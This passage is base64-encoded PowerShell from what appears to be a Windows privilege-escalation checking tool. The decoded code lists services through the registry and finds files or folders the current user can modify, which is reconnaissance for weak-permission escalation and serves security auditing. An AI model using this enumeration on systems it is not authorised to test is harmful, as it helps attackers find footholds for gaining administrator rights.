JlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW1hZ2VQYXRoIiAtVmFsdWUgJFNlcnZpY2VQcm9wZXJ0aWVzLkltYWdlUGF0aCAKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJTdGFydE1vZGUiIC1WYWx1ZSAkKENvbnZlcnQtU2VydmljZVN0YXJ0TW9kZVRvU3RyaW5nIC1TdGFydE1vZGUgJFNlcnZpY2VQcm9wZXJ0aWVzLlN0YXJ0KQogICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAkKENvbnZlcnQtU2VydmljZVR5cGVUb1N0cmluZyAtU2VydmljZVR5cGUgJFByb3BlcnRpZXMuVHlwZSkKICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJSZWdpc3RyeUtleSIgLVZhbHVlICRTZXJ2aWNlUHJvcGVydGllcy5OYW1lCiAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUmVnaXN0cnlQYXRoIiAtVmFsdWUgJFNlcnZpY2VQcm9wZXJ0aWVzLlBTUGF0aAogICAgICAgICRTZXJ2aWNlSXRlbQogICAgfQp9CgpmdW5jdGlvbiBHZXQtU2VydmljZUxpc3QgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEVudW1lcmF0ZXMgc2VydmljZXMgKGJhc2VkIG9uIHRoZSByZWdpc3RyeSkKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgdXNlcyB0aGUgcmVnaXN0cnkgdG8gZW51bWVyYXRlIHRoZSBzZXJ2aWNlcyBieSBsb29raW5nIGZvciB0aGUgc3Via2V5cyBvZiAKICAgICJIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzIi4gVGhpcyBhbGxvd3MgYW55IHVzZXIgdG8gZ2V0IGluZm9ybWF0aW9uCiAgICBhYm91dCBhbGwgdGhlIHNlcnZpY2VzLiBTbywgZXZlbiBpZiBub24tcHJpdmlsZWdlZCB1c2VycyBjYW4ndCBhY2Nlc3MgdGhlIGRldGFpbHMgb2YgYSBzZXJ2aWNlCiAgICB0aHJvdWdoIHRoZSBTZXJ2aWNlIENvbnRyb2wgTWFuYWdlciwgdGhleSBjYW4gZG8gc28gc2ltcGx5IGJ5IGFjY2Vzc2luZyB0aGUgcmVnaXN0cnkuCiAgICAKICAgIC5QQVJBTUVURVIgRmlsdGVyTGV2ZWwKCiAgICBUaGlzIHBhcmFtZXRlciBjYW4gYmUgdXNlZCB0byBmaWx0ZXIgb3V0IHRoZSByZXN1bHQgcmV0dXJuZWQgYnkgdGhlIGZ1bmN0aW9uIGJhc2VkIG9uIHRoZSAKICAgIGZvbGxvd2luZyBjcml0ZXJpYToKICAgICAgICBGaWx0ZXJMZXZlbCA9IDAgLSBObyBmaWx0ZXJpbmcgCiAgICAgICAgRmlsdGVyTGV2ZWwgPSAxIC0gRXhjbHVkZSAnU2VydmljZXMgd2l0aCBlbXB0eSBJbWFnZVBhdGgnCiAgICAgICAgRmlsdGVyTGV2ZWwgPSAyIC0gRXhjbHVkZSAnU2VydmljZXMgd2l0aCBlbXB0eSBJbWFnZVBhdGgnICsgJ0RyaXZlcnMnIAogICAgICAgIEZpbHRlckxldmVsID0gMyAtIEV4Y2x1ZGUgJ1NlcnZpY2VzIHdpdGggZW1wdHkgSW1hZ2VQYXRoJyArICdEcml2ZXJzJyArICdLbm93biBzZXJ2aWNlcycgCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBHZXQtU2VydmljZUxpc3QgLUZpbHRlckxldmVsIDMKCiAgICBOYW1lICAgICAgICAgOiBWTVRvb2xzCiAgICBEaXNwbGF5TmFtZSAgOiBWTXdhcmUgVG9vbHMKICAgIFVzZXIgICAgICAgICA6IExvY2FsU3lzdGVtCiAgICBJbWFnZVBhdGggICAgOiAiQzpcUHJvZ3JhbSBGaWxlc1xWTXdhcmVcVk13YXJlIFRvb2xzXHZtdG9vbHNkLmV4ZSIKICAgIFN0YXJ0TW9kZSAgICA6IEF1dG9tYXRpYwogICAgVHlwZSAgICAgICAgIDogV2luMzJPd25Qcm9jZXNzCiAgICBSZWdpc3RyeUtleSAgOiBIS0VZX0xPQ0FMX01BQ0hJTkVcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFZNVG9vbHMKICAgIFJlZ2lzdHJ5UGF0aCA6IE1pY3Jvc29mdC5Qb3dlclNoZWxsLkNvcmVcUmVnaXN0cnk6OkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcVk1Ub29scwogICAgCiAgICAuTk9URVMKCiAgICBBIHNlcnZpY2UgIlR5cGUiIGNhbiBiZSBvbmUgb2YgdGhlIGZvbGxvd2luZzoKICAgICAgICBLZXJuZWxEcml2ZXIgPSAxCiAgICAgICAgRmlsZVN5c3RlbURyaXZlciA9IDIKICAgICAgICBBZGFwdGVyID0gNAogICAgICAgIFJlY29nbml6ZXJEcml2ZXIgPSA4CiAgICAgICAgV2luMzJPd25Qcm9jZXNzID0gMTYKICAgICAgICBXaW4zMlNoYXJlUHJvY2VzcyA9IDMyIAogICAgICAgIEludGVyYWN0aXZlUHJvY2VzcyA9IDI1NgoKICAgICM+CiAgICAKICAgIFtDbWRsZXRCaW5kaW5nKCldIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbVmFsaWRhdGVTZXQoMCwxLDIsMyldCiAgICAgICAgW2ludF0KICAgICAgICAkRmlsdGVyTGV2ZWwKICAgICkKCiAgICBpZiAoJENhY2hlZFNlcnZpY2VMaXN0LkNvdW50IC1lcSAwKSB7CgogICAgICAgICMgSWYgdGhlIGNhY2hlZCBzZXJ2aWNlIGxpc3QgaGFzbid0IGJlZW4gaW5pdGlhbGl6ZWQgeWV0LCBlbnVtZXJhdGUgYWxsIHNlcnZpY2VzIGFuZCAKICAgICAgICAjIHBvcHVsYXRlIHRoZSBjYWNoZS4KCiAgICAgICAgJFNlcnZpY2VzUmVnUGF0aCA9ICJSZWdpc3RyeTo6SEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlcyIgCiAgICAgICAgJFJlZ0FsbFNlcnZpY2VzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkU2VydmljZXNSZWdQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgICAgIEZvckVhY2ggKCRSZWdTZXJ2aWNlIGluICRSZWdBbGxTZXJ2aWNlcykgewoKICAgICAgICAgICAgJFByb3BlcnRpZXMgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRSZWdTZXJ2aWNlLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtRXJyb3JWYXJpYWJsZSBHZXRJdGVtUHJvcGVydHlFcnJvcgogICAgICAgICAgICBpZiAoJEdldEl0ZW1Qcm9wZXJ0eUVycm9yKSB7CiAgICAgICAgICAgICAgICAjIElmIGFuIGVycm9yIG9jY3VycmVkLCBza2lwIHRoZSBjdXJyZW50IGl0ZW0gCiAgICAgICAgICAgICAgICBjb250aW51ZSAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERpc3BsYXlOYW1lID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkV4cGFuZEVudmlyb25tZW50VmFyaWFibGVzKCRQcm9wZXJ0aWVzLkRpc3BsYXlOYW1lKQoKICAgICAgICAgICAgJFNlcnZpY2VJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkUHJvcGVydGllcy5QU0NoaWxkTmFtZQogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEaXNwbGF5TmFtZSIgLVZhbHVlICREaXNwbGF5TmFtZQogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJVc2VyIiAtVmFsdWUgJFByb3BlcnRpZXMuT2JqZWN0TmFtZSAKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW1hZ2VQYXRoIiAtVmFsdWUgJFByb3BlcnRpZXMuSW1hZ2VQYXRoIAogICAgICAgICAgICAkU2VydmljZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJTdGFydE1vZGUiIC1WYWx1ZSAkKENvbnZlcnQtU2VydmljZVN0YXJ0TW9kZVRvU3RyaW5nIC1TdGFydE1vZGUgJFByb3BlcnRpZXMuU3RhcnQpCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAkKENvbnZlcnQtU2VydmljZVR5cGVUb1N0cmluZyAtU2VydmljZVR5cGUgJFByb3BlcnRpZXMuVHlwZSkKICAgICAgICAgICAgJFNlcnZpY2VJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUmVnaXN0cnlLZXkiIC1WYWx1ZSAkUmVnU2VydmljZS5OYW1lCiAgICAgICAgICAgICRTZXJ2aWNlSXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlJlZ2lzdHJ5UGF0aCIgLVZhbHVlICRSZWdTZXJ2aWNlLlBTUGF0aCAKCiAgICAgICAgICAgIFt2b2lkXSAkQ2FjaGVkU2VydmljZUxpc3QuQWRkKCRTZXJ2aWNlSXRlbSkKICAgICAgICB9CiAgICB9CgogICAgRm9yRWFjaCAoJFNlcnZpY2VJdGVtIGluICRDYWNoZWRTZXJ2aWNlTGlzdCkgewoKICAgICAgICAjIEZpbHRlckxldmVsID0gMCAtIEFkZCB0aGUgc2VydmljZSB0byB0aGUgbGlzdCBhbmQgZ28gdG8gdGhlIG5leHQgb25lIAogICAgICAgIGlmICgkRmlsdGVyTGV2ZWwgLWVxIDApIHsKICAgICAgICAgICAgJFNlcnZpY2VJdGVtCiAgICAgICAgICAgIGNvbnRpbnVlIAogICAgICAgIH0KCiAgICAgICAgaWYgKCRTZXJ2aWNlSXRlbS5JbWFnZVBhdGggLWFuZCAoLW5vdCAoJFNlcnZpY2VJdGVtLkltYWdlUGF0aC50cmltKCkgLWVxICcnKSkpIHsKCiAgICAgICAgICAgICMgRmlsdGVyTGV2ZWwgPSAxIC0gQWRkIHRoZSBzZXJ2aWNlIHRvIHRoZSBsaXN0IG9mIGl0cyBJbWFnZVBhdGggaXMgbm90IGVtcHR5CiAgICAgICAgICAgIGlmICgkRmlsdGVyTGV2ZWwgLWxlIDEpIHsKICAgICAgICAgICAgICAgICRTZXJ2aWNlSXRlbQogICAgICAgICAgICAgICAgY29udGludWUgCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChAKCJXaW4zMk93blByb2Nlc3MiLCAiV2luMzJTaGFyZVByb2Nlc3MiLCAiSW50ZXJhY3RpdmVQcm9jZXNzIikgLWNvbnRhaW5zICRTZXJ2aWNlSXRlbS5UeXBlKSB7CgogICAgICAgICAgICAgICAgIyBGaWx0ZXJMZXZlbCA9IDIgLSBBZGQgdGhlIHNlcnZpY2UgdG8gdGhlIGxpc3QgaWYgaXQncyBub3QgYSBkcml2ZXIgCiAgICAgICAgICAgICAgICBpZiAoJEZpbHRlckxldmVsIC1sZSAyKSB7CiAgICAgICAgICAgICAgICAgICAgJFNlcnZpY2VJdGVtCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Jc0tub3duU2VydmljZSAtU2VydmljZSAkU2VydmljZUl0ZW0pKSB7CgogICAgICAgICAgICAgICAgICAgICMgRmlsdGVyTGV2ZWwgPSAzIC0gQWRkIHRoZSBzZXJ2aWNlIGlmIGl0J3Mgbm90IGEgYnVpbHQtaW4gV2luZG93cyBzZXJ2aWNlIAogICAgICAgICAgICAgICAgICAgIGlmICgkRmlsdGVyTGV2ZWwgLWxlIDMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlcnZpY2VJdGVtCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBHZXQtTW9kaWZpYWJsZVBhdGggewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIFBhcnNlcyBhIHBhc3NlZCBzdHJpbmcgY29udGFpbmluZyBtdWx0aXBsZSBwb3NzaWJsZSBmaWxlL2ZvbGRlciBwYXRocyBhbmQgcmV0dXJucwogICAgdGhlIGZpbGUgcGF0aHMgd2hlcmUgdGhlIGN1cnJlbnQgdXNlciBoYXMgbW9kaWZpY2F0aW9uIHJpZ2h0cy4KCiAgICBBdXRob3I6IEBoYXJtajB5CiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKCiAgICAuREVTQ1JJUFRJT04KCiAgICBUYWtlcyBhIGNvbXBsZXggcGF0aCBzcGVjaWZpY2F0aW9uIG9mIGFuIGluaXRpYWwgZmlsZS9mb2xkZXIgcGF0aCB3aXRoIHBvc3NpYmxlCiAgICBjb25maWd1cmF0aW9uIGZpbGVzLCAndG9rZW5pemVzJyB0aGUgc3RyaW5nIGluIGEgbnVtYmVyIG9mIHBvc3NpYmxlIHdheXMsIGFuZAogICAgZW51bWVyYXRlcyB0aGUgQUNMcyBmb3IgZWFjaCBwYXRoIHRoYXQgY3VycmVudGx5IGV4aXN0cyBvbiB0aGUgc3lzdGVtLiBBbnkgcGF0aCB0aGF0CiAgICB0aGUgY3VycmVudCB1c2VyIGhhcyBtb2RpZmljYXRpb24gcmlnaHRzIG9uIGlzIHJldHVybmVkIGluIGEgY3VzdG9tIG9iamVjdCB0aGF0IGNvbnRhaW5zCiAgICB0aGUgbW9kaWZpYWJsZSBwYXRoLCBhc3NvY2lhdGVkIHBlcm1pc3Npb24gc2V0LCBhbmQgdGhlIElkZW50aXR5UmVmZXJlbmNlIHdpdGggdGhlIHNwZWNpZmllZAogICAgcmlnaHRzLiBUaGUgU0lEIG9mIHRoZSBjdXJyZW50IHVzZXIgYW5kIGFueSBncm91cCBoZS9zaGUgYXJlIGEgcGFydCBvZiBhcmUgdXNlZCBhcyB0aGUKICAgIGNvbXBhcmlzb24gc2V0IGFnYWluc3QgdGhlIHBhcnNlZCBwYXRoIERBQ0xzLgoKICAgIEBpdG00bjogSSBtYWRlIHNvbWUgc21hbGwgY2hhbmdlcyB0byB0aGUgb3JpZ2luYWwgY29kZSBpbiBvcmRlciB0byBwcmV2ZW50IGZhbHNlIHBvc2l0aXZlcyBhcwogICAgbXVjaCBhcyBwb3NzaWJsZS4gCgogICAgLlBBUkFNRVRFUiBQYXRoCgogICAgVGhlIHN0cmluZyBwYXRoIHRvIHBhcnNlIGZvciBtb2RpZmlhYmxlIGZpbGVzLiBSZXF1aXJlZAoKICAgIC5QQVJBTUVURVIgTGl0ZXJhbFBhdGhzCgogICAgU3dpdGNoLiBUcmVhdCBhbGwgcGF0aHMgYXMgbGl0ZXJhbCAoaS5lLiBkb24ndCBkbyAndG9rZW5pemF0aW9uJykuCgogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+ICciQzpcVGVtcFxibGFoLmV4ZSIgLWYgIkM6XFRlbXBcY29uZmlnLmluaSInIHwgR2V0LU1vZGlmaWFibGVQYXRoCgogICAgUGF0aCAgICAgICAgICAgICAgICAgICAgICAgUGVybWlzc2lvbnMgICAgICAgICAgICAgICAgSWRlbnRpdHlSZWZlcmVuY2UKICAgIC0tLS0gICAgICAgICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0tLS0tCiAgICBDOlxUZW1wXGJsYWguZXhlICAgICAgICAgICB7UmVhZEF0dHJpYnV0ZXMsIFJlYWRDby4uLiBOVCBBVVRIT1JJVFlcQXV0aGVudGljLi4uCiAgICBDOlxUZW1wXGNvbmZpZy5pbmkgICAgICAgICB7UmVhZEF0dHJpYnV0ZXMsIFJlYWRDby4uLiBOVCBBVVRIT1JJVFlcQXV0aGVudGljLi4uCgogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1DaGlsZEl0ZW0gQzpcVnVsblwgLVJlY3Vyc2UgfCBHZXQtTW9kaWZpYWJsZVBhdGgKCiAgICBQYXRoICAgICAgICAgICAgICAgICAgICAgICBQZXJtaXNzaW9ucyAgICAgICAgICAgICAgICBJZGVudGl0eVJlZmVyZW5jZQogICAgLS0tLSAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLS0tLS0gICAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0KICAgIEM6XFZ1bG5cYmxhaC5iYXQgICAgICAgICAgIHtSZWFkQXR0cmlidXRlcywgUmVhZENvLi4uIE5UIEFVVEhPUklUWVxBdXRoZW50aWMuLi4KICAgIEM6XFZ1bG5cY29uZmlnLmluaSAgICAgICAgIHtSZWFkQXR0cmlidXRlcywgUmVhZENvLi4uIE5UIEFVVEhPUklUWVxBdXRoZW50aWMuLi4KICAgIC4uLgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdGdWxsTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTGl0ZXJhbFBhdGhzCiAgICApCgogICAgQkVHSU4gewoKICAgICAgICAjIGZyb20gaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yODAyOTg3Mi9yZXRyaWV2aW5nLXNlY3VyaXR5LWRlc2NyaXB0b3ItYW5kLWdldHRpbmctbnVtYmVyLWZvci1maWxlc3lzdGVtcmlnaHRzCiAgICAgICAgJEFjY2Vzc01hc2sgPSBAewogICAgICAgICAgICBbdWludDMyXScweDgwMDAwMDAwJyA9ICdHZW5lcmljUmVhZCcKICAgICAgICAgICAgW3VpbnQzMl0nMHg0MDAwMDAwMCcgPSAnR2VuZXJpY1dyaXRlJwogICAgICAgICAgICBbdWludDMyXScweDIwMDAwMDAwJyA9ICdHZW5lcmljRXhlY3V0ZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgxMDAwMDAwMCcgPSAnR2VuZXJpY0FsbCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMjAwMDAwMCcgPSAnTWF4aW11bUFsbG93ZWQnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDEwMDAwMDAnID0gJ0FjY2Vzc1N5c3RlbVNlY3VyaXR5JwogICAgICAgICAgICBbdWludDMyXScweDAwMTAwMDAwJyA9ICdTeW5jaHJvbml6ZScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDA4MDAwMCcgPSAnV3JpdGVPd25lcicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDA0MDAwMCcgPSAnV3JpdGVEQUMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMjAwMDAnID0gJ1JlYWRDb250cm9sJwogICAgICAgICAgICBbdWludDMyXScweDAwMDEwMDAwJyA9ICdEZWxldGUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAxMDAnID0gJ1dyaXRlQXR0cmlidXRlcycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA4MCcgPSAnUmVhZEF0dHJpYnV0ZXMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwNDAnID0gJ0RlbGV0ZUNoaWxkJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDIwJyA9ICdFeGVjdXRlL1RyYXZlcnNlJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDEwJyA9ICdXcml0ZUV4dGVuZGVkQXR0cmlidXRlcycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwOCcgPSAnUmVhZEV4dGVuZGVkQXR0cmlidXRlcycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwNCcgPSAnQXBwZW5kRGF0YS9BZGRTdWJkaXJlY3RvcnknCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMDInID0gJ1dyaXRlRGF0YS9BZGRGaWxlJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDAxJyA9ICdSZWFkRGF0YS9MaXN0RGlyZWN0b3J5JwogICAgICAgIH0KCiAgICAgICAgJFVzZXJJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQogICAgICAgICRDdXJyZW50VXNlclNpZHMgPSAkVXNlcklkZW50aXR5Lkdyb3VwcyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFZhbHVlCiAgICAgICAgJEN1cnJlbnRVc2VyU2lkcyArPSAkVXNlcklkZW50aXR5LlVzZXIuVmFsdWUKCiAgICAgICAgJFRyYW5zbGF0ZWRJZGVudGl0eVJlZmVyZW5jZXMgPSBAe30KICAgIH0KCiAgICBQUk9DRVNTIHsKCiAgICAgICAgRm9yRWFjaCgkVGFyZ2V0UGF0aCBpbiAkUGF0aCkgewoKICAgICAgICAgICAgJENhbmRpZGF0ZVBhdGhzID0gQCgpCgogICAgICAgICAgICAjIHBvc3NpYmxlIHNlcGFyYXRvciBjaGFyYWN0ZXIgY29tYmluYXRpb25zCiAgICAgICAgICAgICRTZXBhcmF0aW9uQ2hhcmFjdGVyU2V0cyA9IEAoJyInLCAiJyIsICcgJywgImAiJyIsICciICcsICInICIsICJgIicgIikKCiAgICAgICAgICAgIGlmKCRQU0JvdW5kUGFyYW1ldGVyc1snTGl0ZXJhbFBhdGhzJ10pIHsKCiAgICAgICAgICAgICAgICAkVGVtcFBhdGggPSAkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpFeHBhbmRFbnZpcm9ubWVudFZhcmlhYmxlcygkVGFyZ2V0UGF0aCkpCgogICAgICAgICAgICAgICAgaWYoVGVzdC1QYXRoIC1QYXRoICRUZW1wUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgICRDYW5kaWRhdGVQYXRocyArPSBSZXNvbHZlLVBhdGggLVBhdGggJFRlbXBQYXRoIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUGF0aAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGUgcGF0aCBkb2Vzbid0IGV4aXN0LCBjaGVjayBpZiB0aGUgcGFyZW50IGZvbGRlciBhbGxvd3MgZm9yIG1vZGlmaWNhdGlvbgogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQYXJlbnRQYXRoID0gU3BsaXQtUGF0aCAkVGVtcFBhdGggLVBhcmVudAogICAgICAgICAgICAgICAgICAgICAgICBpZigkUGFyZW50UGF0aCAtYW5kIChUZXN0LVBhdGggLVBhdGggJFBhcmVudFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ2FuZGlkYXRlUGF0aHMgKz0gUmVzb2x2ZS1QYXRoIC1QYXRoICRQYXJlbnRQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUGF0aAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBiZWNhdXNlIFNwbGl0LVBhdGggZG9lc24ndCBoYW5kbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgbmljZWx5CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFRhcmdldFBhdGggPSAkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpFeHBhbmRFbnZpcm9ubWVudFZhcmlhYmxlcygkVGFyZ2V0UGF0aCkpLlRyaW0oKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBGb3JFYWNoKCRTZXBhcmF0aW9uQ2hhcmFjdGVyU2V0IGluICRTZXBhcmF0aW9uQ2hhcmFjdGVyU2V0cykgewogICAgICAgICAgICAgICAgICAgICRUYXJnZXRQYXRoLlNwbGl0KCRTZXBhcmF0aW9uQ2hhcmFjdGVyU2V0KSB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAoJF8udHJpbSgpIC1uZSAnJyl9IHwgRm9yRWFjaC1PYmplY3QgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgKCRfIC1tYXRjaCAiXltBLVpdOmAkIikpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkU2VwYXJhdGlvbkNoYXJhY3RlclNldCAtbm90bWF0Y2ggJyAnKSB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUZW1wUGF0aCA9ICQoW1N5c3RlbS5FbnZpcm9ubWVudF06OkV4cGFuZEVudmlyb25tZW50VmFyaWFibGVzKCRfKSkuVHJpbSgpCiAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBwYXRoIGlzIGFjdHVhbGx5IGFuIG9wdGlvbiBsaWtlICcvc3ZjJywgc2tpcCBpdCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGl0IHdpbGwgcHJldmVudCBhIGxvdCBvZiBmYWxzZSBwb3NpdGl2ZXMgYnV0IGl0IG1pZ2h0IGFsc28gc2tpcCB2dWxuZXJhYmxlIHBhdGhzIGluIHNvbWUgcGFydGljdWxhciBjYXNlcyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHRob3VnaCwgaXQncyBtb3JlIGNvbW1vbiB0byBzZWUgb3B0aW9ucyBsaWtlICcvc3ZjJyB0aGFuIGZpbGUgcGF0aHMgbGlrZSAnL1Byb2dyYW1EYXRhL3NvbWV0aGluZycgaW4gV2luZG93cyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgKCRUZW1wUGF0aCAtTGlrZSAiLyoiKSkgLWFuZCAoLW5vdCAoJFRlbXBQYXRoIC1tYXRjaCAiXltBLVpdOmAkIikpKSB7IAogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRUZW1wUGF0aCAtYW5kICgkVGVtcFBhdGggLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkVGVtcFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBwYXRoIGV4aXN0cywgcmVzb2x2ZSBpdCBhbmQgYWRkIGl0IHRvIHRoZSBjYW5kaWRhdGUgbGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDYW5kaWRhdGVQYXRocyArPSBSZXNvbHZlLVBhdGggLVBhdGggJFRlbXBQYXRoIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBwYXRoIGRvZXN